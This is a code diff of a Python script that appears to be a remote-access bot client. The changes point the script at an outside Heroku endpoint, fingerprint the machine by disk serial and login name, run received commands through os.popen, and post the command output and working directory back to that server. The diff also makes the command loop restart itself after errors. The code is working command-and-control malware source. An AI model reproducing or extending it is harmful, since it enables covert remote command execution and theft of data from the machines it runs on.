@@ -4,10 +4,13 @@ import os
 import time
 from datetime import datetime
 
-endpoint_2 = 'http://127.0.0.1:8000/'
-endpoint_1 = 'https://example.com/'
+endpoint_3 = 'http://127.0.0.1:8000/'
+endpoint_2 = 'https://example.com/'
+endpoint_1 = 'https://xxremote.herokuapp.com/'
+
 
 uid = f'{os.popen("wmic diskdrive get serialnumber").read().split()[-1]}'
+# uid = 'IIJS8EUU-SO023-S0SS'
 name = os.getlogin()
 
 def login():
@@ -61,8 +64,9 @@ def commands():
                         cmm = cmm.read()
                         finish = time.time() - time_start
                         print('finish')
-                        content = {'response': cmm, 'client': uid, 'time_received': str(received),
+                        content = {'response': cmm, 'client': uid, 'command': command, 'time_received': str(received),
                                    'exec_duration': str(finish), 'directory': str(os.getcwd())}
+                        print(content)
                         sender = requests.post(f'{endpoint_1}command_feedback', json=content)
                         print(sender)
                 except Exception as e:
@@ -73,6 +77,7 @@ def commands():
                     print(sender)
         except Exception as e:
             print(e)
+            commands()
 
 
 def scripts():
